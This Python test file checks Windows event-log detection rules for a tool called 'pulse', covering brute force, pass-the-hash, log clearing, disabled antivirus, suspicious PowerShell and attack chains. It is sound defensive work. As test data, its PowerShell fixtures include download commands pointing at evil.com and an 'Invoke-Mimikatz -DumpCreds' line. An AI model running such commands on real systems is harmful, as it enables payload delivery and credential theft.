# test_detections.py
# -------------------
# Unit tests for our detection rules.
#
# WHAT ARE UNIT TESTS?
# Tests are code that checks if your other code works correctly.
# You write small, focused tests that say "if I give this input,
# I expect this output." Then you run them to make sure nothing
# is broken. This is especially important for security tools —
# we need to be confident our detections actually catch threats.
#
# HOW TO RUN TESTS:
#   python -m pytest test_detections.py -v
#
# The "-v" flag means "verbose" — it shows each test name and whether
# it passed or failed, instead of just dots.
#
# HOW THESE TESTS WORK:
# Instead of needing real .evtx files, we build fake event dictionaries
# that look exactly like what parser.py would produce. This lets us
# control the input precisely and test specific scenarios.


from pulse.detections import (
    detect_brute_force,
    detect_user_creation,
    detect_privilege_escalation,
    detect_log_clearing,
    detect_firewall_rule_change,
    detect_firewall_disabled,
    detect_av_disabled,
    detect_service_installed,
    detect_rdp_logon,
    detect_pass_the_hash,
    detect_account_lockout,
    detect_scheduled_task_created,
    detect_suspicious_powershell,
    detect_account_takeover_chain,
    detect_malware_persistence_chain,
    run_all_detections,
    BRUTE_FORCE_THRESHOLD,
    BRUTE_FORCE_WINDOW_MINUTES,
)


# ---------------------------------------------------------------------------
# HELPER FUNCTION — builds fake events so we don't repeat ourselves
# ---------------------------------------------------------------------------
# In real .evtx data, each event has an "event_id", a "timestamp", and
# "data" (the raw XML string). Our detections read the XML to extract
# details like usernames. So our fake XML needs to have the right structure.

def make_failed_login_event(username, timestamp="2024-01-15T08:00:00.000000Z"):
    """
    Builds a fake Event 4625 (failed login) dictionary.

    Parameters:
        username (str):  The account name that "failed" to log in.
        timestamp (str): When it happened. Use ISO format with microseconds,
                         e.g. "2024-01-15T08:00:01.000000Z"

    Returns:
        dict: An event dictionary in the same format parse_evtx() returns.
    """
    xml = (
        '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
        "  <System>"
        "    <EventID>4625</EventID>"
        f'    <TimeCreated SystemTime="{timestamp}" />'
        "  </System>"
        "  <EventData>"
        f'    <Data Name="TargetUserName">{username}</Data>'
        '    <Data Name="LogonType">3</Data>'
        "  </EventData>"
        "</Event>"
    )
    return {"event_id": 4625, "timestamp": timestamp, "data": xml}


def make_rapid_failures(username, count, start_seconds=0):
    """
    Helper that builds multiple failed login events 1 second apart.
    This simulates a real brute force burst — failures happening rapidly.

    Parameters:
        username (str):      The account being attacked.
        count (int):         How many failure events to create.
        start_seconds (int): Offset the start time (useful for spacing tests).

    Returns:
        list: A list of event dictionaries.
    """
    events = []
    for i in range(count):
        # Each failure is 1 second after the previous one.
        # zfill(6) pads the microseconds to 6 digits: "1" -> "000001"
        ts = f"2024-01-15T08:{str(start_seconds // 60).zfill(2)}:{str((start_seconds + i) % 60).zfill(2)}.000000Z"
        events.append(make_failed_login_event(username, timestamp=ts))
    return events


def make_user_created_event(new_user, created_by, timestamp="2024-01-15T09:00:00.000Z"):
    """
    Builds a fake Event 4720 (user account created) dictionary.
    """
    xml = (
        '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
        "  <System>"
        "    <EventID>4720</EventID>"
        f'    <TimeCreated SystemTime="{timestamp}" />'
        "  </System>"
        "  <EventData>"
        f'    <Data Name="TargetUserName">{new_user}</Data>'
        f'    <Data Name="SubjectUserName">{created_by}</Data>'
        "  </EventData>"
        "</Event>"
    )
    return {"event_id": 4720, "timestamp": timestamp, "data": xml}


def make_privilege_escalation_event(member, group, added_by, timestamp="2024-01-15T10:00:00.000Z"):
    """
    Builds a fake Event 4732 (user added to security group) dictionary.
    """
    xml = (
        '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
        "  <System>"
        "    <EventID>4732</EventID>"
        f'    <TimeCreated SystemTime="{timestamp}" />'
        "  </System>"
        "  <EventData>"
        f'    <Data Name="MemberName">{member}</Data>'
        f'    <Data Name="TargetUserName">{group}</Data>'
        f'    <Data Name="SubjectUserName">{added_by}</Data>'
        "  </EventData>"
        "</Event>"
    )
    return {"event_id": 4732, "timestamp": timestamp, "data": xml}


def make_log_cleared_event(cleared_by, timestamp="2024-01-15T11:00:00.000Z"):
    """
    Builds a fake Event 1102 (audit log cleared) dictionary.
    """
    xml = (
        '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
        "  <System>"
        "    <EventID>1102</EventID>"
        f'    <TimeCreated SystemTime="{timestamp}" />'
        "  </System>"
        "  <EventData>"
        f'    <Data Name="SubjectUserName">{cleared_by}</Data>'
        "  </EventData>"
        "</Event>"
    )
    return {"event_id": 1102, "timestamp": timestamp, "data": xml}


def make_firewall_rule_event(event_id, rule_name, timestamp="2024-01-15T12:00:00.000Z"):
    """
    Builds a fake Event 4946 (rule added) or 4947 (rule modified) dictionary.

    Parameters:
        event_id (int):   Either 4946 or 4947.
        rule_name (str):  The name of the firewall rule that was changed.
        timestamp (str):  When it happened.
    """
    xml = (
        '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
        "  <System>"
        f"    <EventID>{event_id}</EventID>"
        f'    <TimeCreated SystemTime="{timestamp}" />'
        "  </System>"
        "  <EventData>"
        f'    <Data Name="RuleName">{rule_name}</Data>'
        "  </EventData>"
        "</Event>"
    )
    return {"event_id": event_id, "timestamp": timestamp, "data": xml}


def make_firewall_disabled_event(profile, timestamp="2024-01-15T12:30:00.000Z"):
    """
    Builds a fake Event 4950 (firewall profile changed) dictionary.

    Parameters:
        profile (str):  The firewall profile name (e.g., "Domain", "Public").
        timestamp (str): When it happened.
    """
    xml = (
        '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
        "  <System>"
        "    <EventID>4950</EventID>"
        f'    <TimeCreated SystemTime="{timestamp}" />'
        "  </System>"
        "  <EventData>"
        f'    <Data Name="ProfileName">{profile}</Data>'
        "  </EventData>"
        "</Event>"
    )
    return {"event_id": 4950, "timestamp": timestamp, "data": xml}


def make_account_lockout_event(username, timestamp="2024-01-15T12:45:00.000Z"):
    """
    Builds a fake Event 4740 (account lockout) dictionary.

    Parameters:
        username (str):   The account that was locked out.
        timestamp (str):  When it happened.
    """
    xml = (
        '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
        "  <System>"
        "    <EventID>4740</EventID>"
        f'    <TimeCreated SystemTime="{timestamp}" />'
        "  </System>"
        "  <EventData>"
        f'    <Data Name="TargetUserName">{username}</Data>'
        "  </EventData>"
        "</Event>"
    )
    return {"event_id": 4740, "timestamp": timestamp, "data": xml}


def make_scheduled_task_event(task_name, created_by, timestamp="2024-01-15T12:50:00.000Z"):
    """
    Builds a fake Event 4698 (scheduled task created) dictionary.

    Parameters:
        task_name (str):   Name of the scheduled task.
        created_by (str):  The user who created it.
        timestamp (str):   When it happened.
    """
    xml = (
        '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
        "  <System>"
        "    <EventID>4698</EventID>"
        f'    <TimeCreated SystemTime="{timestamp}" />'
        "  </System>"
        "  <EventData>"
        f'    <Data Name="TaskName">{task_name}</Data>'
        f'    <Data Name="SubjectUserName">{created_by}</Data>'
        "  </EventData>"
        "</Event>"
    )
    return {"event_id": 4698, "timestamp": timestamp, "data": xml}


def make_powershell_event(script_text, timestamp="2024-01-15T12:55:00.000Z"):
    """
    Builds a fake Event 4104 (PowerShell script block logging) dictionary.

    Parameters:
        script_text (str): The PowerShell script content.
        timestamp (str):   When it happened.
    """
    xml = (
        '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
        "  <System>"
        "    <EventID>4104</EventID>"
        f'    <TimeCreated SystemTime="{timestamp}" />'
        "  </System>"
        "  <EventData>"
        f'    <Data Name="ScriptBlockText">{script_text}</Data>'
        "  </EventData>"
        "</Event>"
    )
    return {"event_id": 4104, "timestamp": timestamp, "data": xml}


def make_av_disabled_event(timestamp="2024-01-15T13:00:00.000Z"):
    """
    Builds a fake Event 5001 (antivirus real-time protection disabled) dictionary.
    """
    xml = (
        '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
        "  <System>"
        "    <EventID>5001</EventID>"
        f'    <TimeCreated SystemTime="{timestamp}" />'
        "  </System>"
        "  <EventData>"
        "  </EventData>"
        "</Event>"
    )
    return {"event_id": 5001, "timestamp": timestamp, "data": xml}


def make_service_installed_event(service_name, account, timestamp="2024-01-15T14:00:00.000Z"):
    """
    Builds a fake Event 7045 (new service installed) dictionary.

    Parameters:
        service_name (str): Name of the service that was installed.
        account (str):      The account that installed the service.
        timestamp (str):    When it happened.
    """
    xml = (
        '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
        "  <System>"
        "    <EventID>7045</EventID>"
        f'    <TimeCreated SystemTime="{timestamp}" />'
        "  </System>"
        "  <EventData>"
        f'    <Data Name="ServiceName">{service_name}</Data>'
        f'    <Data Name="AccountName">{account}</Data>'
        "  </EventData>"
        "</Event>"
    )
    return {"event_id": 7045, "timestamp": timestamp, "data": xml}


def make_rdp_logon_event(username, logon_type="10", timestamp="2024-01-15T15:00:00.000Z"):
    """
    Builds a fake Event 4624 (successful logon) dictionary.

    Parameters:
        username (str):    The account that logged on.
        logon_type (str):  The logon type ("10" = RDP, "3" = network, etc.).
        timestamp (str):   When it happened.
    """
    xml = (
        '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
        "  <System>"
        "    <EventID>4624</EventID>"
        f'    <TimeCreated SystemTime="{timestamp}" />'
        "  </System>"
        "  <EventData>"
        f'    <Data Name="TargetUserName">{username}</Data>'
        f'    <Data Name="LogonType">{logon_type}</Data>'
        '    <Data Name="IpAddress">192.168.1.100</Data>'
        "  </EventData>"
        "</Event>"
    )
    return {"event_id": 4624, "timestamp": timestamp, "data": xml}


def make_pth_event(username, source_ip="192.168.1.50", timestamp="2024-01-15T15:05:00.000Z"):
    """
    Builds a fake Event 4624 with Pass-the-Hash indicators.

    The three tell-tale fields that distinguish PtH from a normal logon:
      - LogonType = 3 (network logon)
      - AuthenticationPackageName = NTLM
      - LogonProcessName = NtLmSsp

    Parameters:
        username (str):   The account that was used.
        source_ip (str):  Where the connection came from.
        timestamp (str):  When it happened.
    """
    xml = (
        '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
        "  <System>"
        "    <EventID>4624</EventID>"
        f'    <TimeCreated SystemTime="{timestamp}" />'
        "  </System>"
        "  <EventData>"
        f'    <Data Name="TargetUserName">{username}</Data>'
        '    <Data Name="LogonType">3</Data>'
        '    <Data Name="AuthenticationPackageName">NTLM</Data>'
        '    <Data Name="LogonProcessName">NtLmSsp </Data>'
        f'    <Data Name="IpAddress">{source_ip}</Data>'
        "  </EventData>"
        "</Event>"
    )
    return {"event_id": 4624, "timestamp": timestamp, "data": xml}


# ===========================================================================
# BRUTE FORCE TESTS (time-windowed)
# ===========================================================================

def test_brute_force_triggers_within_window():
    """
    5 failures within seconds of each other SHOULD trigger an alert.
    This is the core attack scenario — rapid password guessing.
    """
    # make_rapid_failures creates events 1 second apart — well within 10 minutes.
    events = make_rapid_failures("admin", count=BRUTE_FORCE_THRESHOLD)

    findings = detect_brute_force(events)

    assert len(findings) == 1
    assert findings[0]["rule"] == "Brute Force Attempt"
    assert findings[0]["severity"] == "HIGH"
    assert "admin" in findings[0]["details"]


def test_brute_force_does_not_trigger_below_threshold():
    """
    Fewer than 5 failures, even if rapid, should NOT trigger.
    """
    events = make_rapid_failures("admin", count=BRUTE_FORCE_THRESHOLD - 1)

    findings = detect_brute_force(events)

    assert len(findings) == 0


def test_brute_force_does_not_trigger_when_spread_out():
    """
    5+ failures spread across hours should NOT trigger — that's just typos
    over a normal working day, not a brute force attack.

    This is the key new test that the old version would have FAILED.
    """
    # Build 5 failures, each 3 hours apart — way outside the 10-minute window.
    events = [
        make_failed_login_event("admin", "2024-01-15T08:00:00.000000Z"),
        make_failed_login_event("admin", "2024-01-15T11:00:00.000000Z"),
        make_failed_login_event("admin", "2024-01-15T14:00:00.000000Z"),
        make_failed_login_event("admin", "2024-01-15T17:00:00.000000Z"),
        make_failed_login_event("admin", "2024-01-15T20:00:00.000000Z"),
    ]

    findings = detect_brute_force(events)

    # 5 failures but spread out over 12 hours — no alert.
    assert len(findings) == 0


def test_brute_force_counts_per_account():
    """
    Failures for DIFFERENT accounts are tracked separately.
    3 rapid failures for "admin" + 3 for "guest" = no alert (neither hit 5).
    """
    events = (
        make_rapid_failures("admin", count=3)
        + make_rapid_failures("guest", count=3)
    )

    findings = detect_brute_force(events)

    assert len(findings) == 0


def test_brute_force_multiple_accounts_over_threshold():
    """
    If TWO accounts each have 5+ rapid failures, we should get TWO findings.
    """
    events = (
        make_rapid_failures("admin", count=6)
        + make_rapid_failures("guest", count=7)
    )

    findings = detect_brute_force(events)

    assert len(findings) == 2


def test_brute_force_ignores_other_event_ids():
    """
    Events that aren't 4625 should be completely ignored by this rule.
    """
    events = [make_user_created_event("newguy", "admin") for _ in range(10)]

    findings = detect_brute_force(events)

    assert len(findings) == 0


# ===========================================================================
# USER CREATION TESTS
# ===========================================================================

def test_user_creation_flags_new_account():
    """
    A single 4720 event should produce exactly one finding.
    """
    events = [make_user_created_event("backdoor", "attacker")]

    findings = detect_user_creation(events)

    assert len(findings) == 1
    assert findings[0]["rule"] == "User Account Created"
    assert findings[0]["severity"] == "MEDIUM"
    assert "backdoor" in findings[0]["details"]
    assert "attacker" in findings[0]["details"]


def test_user_creation_flags_multiple():
    """
    Three new accounts should produce three separate findings.
    """
    events = [
        make_user_created_event("user1", "admin"),
        make_user_created_event("user2", "admin"),
        make_user_created_event("user3", "admin"),
    ]

    findings = detect_user_creation(events)

    assert len(findings) == 3


def test_user_creation_ignores_other_events():
    """
    Non-4720 events should be ignored by this rule.
    """
    events = [make_failed_login_event("admin") for _ in range(10)]

    findings = detect_user_creation(events)

    assert len(findings) == 0


# ===========================================================================
# PRIVILEGE ESCALATION TESTS
# ===========================================================================

def test_privilege_escalation_flags_group_add():
    """
    A single 4732 event should produce one finding with all the details.
    """
    events = [make_privilege_escalation_event("backdoor", "Administrators", "attacker")]

    findings = detect_privilege_escalation(events)

    assert len(findings) == 1
    assert findings[0]["rule"] == "Privilege Escalation"
    assert findings[0]["severity"] == "HIGH"
    assert "backdoor" in findings[0]["details"]
    assert "Administrators" in findings[0]["details"]
    assert "attacker" in findings[0]["details"]


def test_privilege_escalation_ignores_other_events():
    """
    Non-4732 events should be ignored.
    """
    events = [make_failed_login_event("admin")]

    findings = detect_privilege_escalation(events)

    assert len(findings) == 0


# ===========================================================================
# LOG CLEARING TESTS
# ===========================================================================

def test_log_clearing_flags_event():
    """
    A single 1102 event should produce one HIGH severity finding.
    """
    events = [make_log_cleared_event("shady_admin")]

    findings = detect_log_clearing(events)

    assert len(findings) == 1
    assert findings[0]["rule"] == "Audit Log Cleared"
    assert findings[0]["severity"] == "HIGH"
    assert "shady_admin" in findings[0]["details"]


def test_log_clearing_ignores_other_events():
    """
    Non-1102 events should be ignored.
    """
    events = [make_user_created_event("newguy", "admin")]

    findings = detect_log_clearing(events)

    assert len(findings) == 0


# ===========================================================================
# RDP LOGON TESTS
# ===========================================================================

def test_rdp_logon_flags_type_10():
    """
    A 4624 event with LogonType 10 (RDP) should produce a finding.
    """
    events = [make_rdp_logon_event("attacker", logon_type="10")]

    findings = detect_rdp_logon(events)

    assert len(findings) == 1
    assert findings[0]["rule"] == "RDP Logon Detected"
    assert findings[0]["severity"] == "MEDIUM"
    assert "attacker" in findings[0]["details"]
    # The source IP should be in the finding details.
    assert "192.168.1.100" in findings[0]["details"]


def test_rdp_logon_ignores_other_logon_types():
    """
    A 4624 event with LogonType 3 (network) should NOT trigger.
    This is the key test — we only care about type 10, not all logons.
    """
    events = [make_rdp_logon_event("user", logon_type="3")]

    findings = detect_rdp_logon(events)

    assert len(findings) == 0


def test_rdp_logon_ignores_other_event_ids():
    """
    Non-4624 events should be ignored entirely.
    """
    events = [make_user_created_event("newguy", "admin")]

    findings = detect_rdp_logon(events)

    assert len(findings) == 0


# ===========================================================================
# PASS-THE-HASH TESTS
# ===========================================================================

def test_pth_flags_ntlm_network_logon():
    """A type-3 NTLM logon via NtLmSsp from an external IP should be flagged."""
    events = [make_pth_event("jsmith", source_ip="10.0.0.55")]

    findings = detect_pass_the_hash(events)

    assert len(findings) == 1
    assert findings[0]["rule"] == "Pass-the-Hash Attempt"
    assert findings[0]["severity"] == "HIGH"
    assert "jsmith" in findings[0]["details"]
    assert "10.0.0.55" in findings[0]["details"]


def test_pth_ignores_rdp_logon():
    """LogonType 10 (RDP) should not be flagged as PtH."""
    events = [make_rdp_logon_event("jsmith", logon_type="10")]

    findings = detect_pass_the_hash(events)

    assert len(findings) == 0


def test_pth_ignores_machine_accounts():
    """Machine accounts (ending in $) are normal NTLM traffic, not PtH."""
    events = [make_pth_event("WORKSTATION01$")]

    findings = detect_pass_the_hash(events)

    assert len(findings) == 0


def test_pth_ignores_localhost():
    """Connections from 127.0.0.1 are internal processes, not PtH."""
    events = [make_pth_event("jsmith", source_ip="127.0.0.1")]

    findings = detect_pass_the_hash(events)

    assert len(findings) == 0


def test_pth_ignores_kerberos():
    """Kerberos logons (AuthenticationPackageName = Kerberos) should not be flagged."""
    xml = (
        '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
        "  <System>"
        "    <EventID>4624</EventID>"
        '    <TimeCreated SystemTime="2024-01-15T15:05:00.000Z" />'
        "  </System>"
        "  <EventData>"
        '    <Data Name="TargetUserName">jsmith</Data>'
        '    <Data Name="LogonType">3</Data>'
        '    <Data Name="AuthenticationPackageName">Kerberos</Data>'
        '    <Data Name="LogonProcessName">Kerberos</Data>'
        '    <Data Name="IpAddress">10.0.0.55</Data>'
        "  </EventData>"
        "</Event>"
    )
    events = [{"event_id": 4624, "timestamp": "2024-01-15T15:05:00.000Z", "data": xml}]

    findings = detect_pass_the_hash(events)

    assert len(findings) == 0


def test_pth_ignores_other_event_ids():
    """Non-4624 events should be ignored."""
    events = [make_failed_login_event("admin")]

    findings = detect_pass_the_hash(events)

    assert len(findings) == 0


# ===========================================================================
# SERVICE INSTALLED TESTS
# ===========================================================================

def test_service_installed_flags_event():
    """
    A 7045 event should produce a finding with the service name and account.
    """
    events = [make_service_installed_event("EvilBackdoor", "LocalSystem")]

    findings = detect_service_installed(events)

    assert len(findings) == 1
    assert findings[0]["rule"] == "Service Installed"
    assert findings[0]["severity"] == "MEDIUM"
    assert "EvilBackdoor" in findings[0]["details"]
    assert "LocalSystem" in findings[0]["details"]


def test_service_installed_flags_multiple():
    """
    Multiple new services should each produce their own finding.
    """
    events = [
        make_service_installed_event("LegitService", "NetworkService"),
        make_service_installed_event("ShadyService", "LocalSystem"),
    ]

    findings = detect_service_installed(events)

    assert len(findings) == 2


def test_service_installed_ignores_other_events():
    """
    Non-7045 events should be ignored.
    """
    events = [make_failed_login_event("admin")]

    findings = detect_service_installed(events)

    assert len(findings) == 0


# ===========================================================================
# ANTIVIRUS DISABLED TESTS
# ===========================================================================

def test_av_disabled_flags_event():
    """
    A single 5001 event should produce one HIGH finding.
    This is the simplest rule — no XML fields to extract, the event IS the alert.
    """
    events = [make_av_disabled_event()]

    findings = detect_av_disabled(events)

    assert len(findings) == 1
    assert findings[0]["rule"] == "Antivirus Disabled"
    assert findings[0]["severity"] == "HIGH"


def test_av_disabled_ignores_other_events():
    """
    Non-5001 events should be ignored.
    """
    events = [make_failed_login_event("admin")]

    findings = detect_av_disabled(events)

    assert len(findings) == 0


# ===========================================================================
# FIREWALL DISABLED TESTS
# ===========================================================================

def test_firewall_disabled_flags_profile_change():
    """
    A 4950 event should produce a HIGH finding with the profile name.
    """
    events = [make_firewall_disabled_event("Public")]

    findings = detect_firewall_disabled(events)

    assert len(findings) == 1
    assert findings[0]["rule"] == "Firewall Disabled"
    assert findings[0]["severity"] == "HIGH"
    assert "Public" in findings[0]["details"]


def test_firewall_disabled_flags_multiple_profiles():
    """
    If multiple profiles are changed, each gets its own finding.
    """
    events = [
        make_firewall_disabled_event("Domain"),
        make_firewall_disabled_event("Private"),
        make_firewall_disabled_event("Public"),
    ]

    findings = detect_firewall_disabled(events)

    assert len(findings) == 3


def test_firewall_disabled_ignores_other_events():
    """
    Non-4950 events should be ignored.
    """
    events = [make_failed_login_event("admin")]

    findings = detect_firewall_disabled(events)

    assert len(findings) == 0


# ===========================================================================
# FIREWALL RULE CHANGED TESTS
# ===========================================================================

def test_firewall_rule_change_flags_added():
    """
    A 4946 event (rule added) should produce a finding that says "added".
    """
    events = [make_firewall_rule_event(4946, "Allow Backdoor Port 4444")]

    findings = detect_firewall_rule_change(events)

    assert len(findings) == 1
    assert findings[0]["rule"] == "Firewall Rule Changed"
    assert findings[0]["severity"] == "MEDIUM"
    # Check that the finding mentions the rule name AND the action.
    assert "Allow Backdoor Port 4444" in findings[0]["details"]
    assert "added" in findings[0]["details"]


def test_firewall_rule_change_flags_modified():
    """
    A 4947 event (rule modified) should produce a finding that says "modified".
    """
    events = [make_firewall_rule_event(4947, "Remote Desktop")]

    findings = detect_firewall_rule_change(events)

    assert len(findings) == 1
    assert "modified" in findings[0]["details"]
    assert "Remote Desktop" in findings[0]["details"]


def test_firewall_rule_change_ignores_other_events():
    """
    Non-4946/4947 events should be ignored.
    """
    events = [make_failed_login_event("admin")]

    findings = detect_firewall_rule_change(events)

    assert len(findings) == 0


# ===========================================================================
# ACCOUNT LOCKOUT TESTS
# ===========================================================================

def test_account_lockout_flags_event():
    """Event 4740 should flag an account lockout."""
    events = [make_account_lockout_event("jsmith")]

    findings = detect_account_lockout(events)

    assert len(findings) == 1
    assert findings[0]["rule"] == "Account Lockout"
    assert findings[0]["severity"] == "HIGH"
    assert "jsmith" in findings[0]["details"]


def test_account_lockout_flags_multiple():
    """Multiple lockouts should each produce a separate finding."""
    events = [
        make_account_lockout_event("jsmith"),
        make_account_lockout_event("admin"),
        make_account_lockout_event("svcaccount"),
    ]

    findings = detect_account_lockout(events)

    assert len(findings) == 3


def test_account_lockout_ignores_other_events():
    """Non-4740 events should be ignored."""
    events = [make_failed_login_event("admin")]

    findings = detect_account_lockout(events)

    assert len(findings) == 0


# ===========================================================================
# SCHEDULED TASK TESTS
# ===========================================================================

def test_scheduled_task_flags_event():
    """Event 4698 should flag a new scheduled task."""
    events = [make_scheduled_task_event("\\MalwareTask", "admin")]

    findings = detect_scheduled_task_created(events)

    assert len(findings) == 1
    assert findings[0]["rule"] == "Scheduled Task Created"
    assert findings[0]["severity"] == "MEDIUM"
    assert "MalwareTask" in findings[0]["details"]
    assert "admin" in findings[0]["details"]


def test_scheduled_task_flags_multiple():
    """Multiple task creations should each produce a finding."""
    events = [
        make_scheduled_task_event("\\Task1", "admin"),
        make_scheduled_task_event("\\Task2", "SYSTEM"),
    ]

    findings = detect_scheduled_task_created(events)

    assert len(findings) == 2


def test_scheduled_task_ignores_other_events():
    """Non-4698 events should be ignored."""
    events = [make_failed_login_event("admin")]

    findings = detect_scheduled_task_created(events)

    assert len(findings) == 0


# ===========================================================================
# SUSPICIOUS POWERSHELL TESTS
# ===========================================================================

def test_powershell_flags_encoded_command():
    """PowerShell with -EncodedCommand should be flagged."""
    events = [make_powershell_event("powershell -EncodedCommand ZQBjAGgAbwA=")]

    findings = detect_suspicious_powershell(events)

    assert len(findings) == 1
    assert findings[0]["rule"] == "Suspicious PowerShell"
    assert findings[0]["severity"] == "HIGH"
    assert "encoded command" in findings[0]["details"]


def test_powershell_flags_download_cradle():
    """PowerShell downloading from the internet should be flagged."""
    events = [make_powershell_event("Invoke-WebRequest -Uri http://evil.com/payload.exe")]

    findings = detect_suspicious_powershell(events)

    assert len(findings) == 1
    assert "web download" in findings[0]["details"]


def test_powershell_flags_mimikatz():
    """PowerShell referencing Mimikatz should be flagged."""
    events = [make_powershell_event("Invoke-Mimikatz -DumpCreds")]

    findings = detect_suspicious_powershell(events)

    assert len(findings) == 1
    assert "credential theft" in findings[0]["details"]


def test_powershell_ignores_benign_scripts():
    """Normal PowerShell scripts without suspicious patterns should not be flagged."""
    events = [make_powershell_event("Get-Process | Where-Object { $_.CPU -gt 100 }")]

    findings = detect_suspicious_powershell(events)

    assert len(findings) == 0


def test_powershell_ignores_other_events():
    """Non-4104 events should be ignored."""
    events = [make_failed_login_event("admin")]

    findings = detect_suspicious_powershell(events)

    assert len(findings) == 0


# ===========================================================================
# ATTACK CHAIN TESTS
# ===========================================================================

def test_account_takeover_chain_full_sequence():
    """
    The full chain: failures → success → new user = CRITICAL finding.
    Each event happens 1 minute after the previous so the order is clear.
    """
    events = [
        # Step 1: 3 failed logins (brute force)
        make_failed_login_event("admin", "2024-01-15T08:00:00.000000Z"),
        make_failed_login_event("admin", "2024-01-15T08:00:01.000000Z"),
        make_failed_login_event("admin", "2024-01-15T08:00:02.000000Z"),
        # Step 2: successful login AFTER the failures
        make_rdp_logon_event("admin", logon_type="3", timestamp="2024-01-15T08:01:00.000000Z"),
        # Step 3: new user created AFTER the successful login
        make_user_created_event("backdoor", "admin", "2024-01-15T08:02:00.000000Z"),
    ]

    findings = detect_account_takeover_chain(events)

    assert len(findings) == 1
    assert findings[0]["rule"] == "Account Takeover Chain"
    assert findings[0]["severity"] == "CRITICAL"
    assert "admin" in findings[0]["details"]
    assert "backdoor" in findings[0]["details"]


def test_account_takeover_chain_no_success():
    """
    Failures without a subsequent success should NOT trigger the chain.
    The attacker tried but didn't get in.
    """
    events = [
        make_failed_login_event("admin", "2024-01-15T08:00:00.000000Z"),
        make_failed_login_event("admin", "2024-01-15T08:00:01.000000Z"),
        make_failed_login_event("admin", "2024-01-15T08:00:02.000000Z"),
        # No successful login — chain is broken
        make_user_created_event("backdoor", "someone", "2024-01-15T08:02:00.000000Z"),
    ]

    findings = detect_account_takeover_chain(events)

    assert len(findings) == 0


def test_account_takeover_chain_no_new_user():
    """
    Failures + success but no new user = no chain finding.
    Maybe just a legitimate user who mistyped their password.
    """
    events = [
        make_failed_login_event("admin", "2024-01-15T08:00:00.000000Z"),
        make_failed_login_event("admin", "2024-01-15T08:00:01.000000Z"),
        make_rdp_logon_event("admin", logon_type="3", timestamp="2024-01-15T08:01:00.000000Z"),
        # No new user created — chain is incomplete
    ]

    findings = detect_account_takeover_chain(events)

    assert len(findings) == 0


def test_malware_persistence_chain_av_then_service():
    """
    AV disabled followed by a new service = CRITICAL malware persistence chain.
    """
    events = [
        # AV turned off first
        make_av_disabled_event("2024-01-15T09:00:00.000000Z"),
        # New service installed AFTER AV is off
        make_service_installed_event("EvilMalware", "LocalSystem", "2024-01-15T09:01:00.000000Z"),
    ]

    findings = detect_malware_persistence_chain(events)

    assert len(findings) == 1
    assert findings[0]["rule"] == "Malware Persistence Chain"
    assert findings[0]["severity"] == "CRITICAL"
    assert "EvilMalware" in findings[0]["details"]


def test_malware_persistence_chain_service_before_av():
    """
    Service installed BEFORE AV was disabled should NOT trigger.
    The ordering matters — if the service came first, it's more likely legit.
    """
    events = [
        # Service installed first (probably legitimate)
        make_service_installed_event("NormalService", "NetworkService", "2024-01-15T08:00:00.000000Z"),
        # AV disabled later (suspicious on its own, but not the chain)
        make_av_disabled_event("2024-01-15T09:00:00.000000Z"),
    ]

    findings = detect_malware_persistence_chain(events)

    # No chain — the service came BEFORE the AV was disabled.
    assert len(findings) == 0


def test_malware_persistence_chain_no_service():
    """
    AV disabled alone (no new service) should not trigger the chain rule.
    The individual detect_av_disabled rule handles that separately.
    """
    events = [
        make_av_disabled_event("2024-01-15T09:00:00.000000Z"),
    ]

    findings = detect_malware_persistence_chain(events)

    assert len(findings) == 0


# ===========================================================================
# RUN_ALL_DETECTIONS TEST
# ===========================================================================

def test_run_all_detections_combines_results():
    """
    run_all_detections() should pass events through ALL rules and combine
    the results. This is an integration test — it checks that the wiring
    between the individual functions and the runner actually works.
    """
    events = (
        # 6 rapid failed logins for "admin" — triggers brute force
        make_rapid_failures("admin", count=6)
        # successful login AFTER the failures — helps trigger account takeover chain
        + [make_rdp_logon_event("admin", logon_type="3", timestamp="2024-01-15T08:01:00.000000Z")]
        # new user AFTER success — completes account takeover chain + triggers user creation
        + [make_user_created_event("backdoor", "admin", "2024-01-15T08:02:00.000000Z")]
        # priv esc — triggers privilege escalation
        + [make_privilege_escalation_event("backdoor", "Administrators", "admin")]
        # log clear — triggers log clearing
        + [make_log_cleared_event("admin")]
        # RDP logon — triggers RDP detection
        + [make_rdp_logon_event("attacker", logon_type="10")]
        # AV disabled first — triggers AV detection + starts malware chain
        + [make_av_disabled_event("2024-01-15T09:00:00.000000Z")]
        # service after AV off — triggers service detection + completes malware chain
        + [make_service_installed_event("EvilSvc", "LocalSystem", "2024-01-15T09:01:00.000000Z")]
        # firewall disabled — triggers firewall disabled
        + [make_firewall_disabled_event("Public")]
        # firewall rule added — triggers firewall rule change
        + [make_firewall_rule_event(4946, "Allow Port 4444")]
        # account lockout — triggers account lockout
        + [make_account_lockout_event("admin")]
        # scheduled task — triggers scheduled task detection
        + [make_scheduled_task_event("\\Updater", "admin")]
        # suspicious PowerShell — triggers PowerShell detection
        + [make_powershell_event("Invoke-WebRequest -Uri http://evil.com/shell.ps1")]
        # pass-the-hash — type 3, NTLM, NtLmSsp, external IP
        + [make_pth_event("admin", source_ip="10.0.0.55")]
    )

    findings = run_all_detections(events)

    # We expect 15 findings: 13 individual rules + 2 chain detections.
    assert len(findings) == 15

    rule_names = set(f["rule"] for f in findings)
    assert rule_names == {
        "Brute Force Attempt",
        "User Account Created",
        "Privilege Escalation",
        "Audit Log Cleared",
        "RDP Logon Detected",
        "Pass-the-Hash Attempt",
        "Service Installed",
        "Antivirus Disabled",
        "Firewall Disabled",
        "Firewall Rule Changed",
        "Account Lockout",
        "Scheduled Task Created",
        "Suspicious PowerShell",
        "Account Takeover Chain",
        "Malware Persistence Chain",
    }


# ---------------------------------------------------------------------------
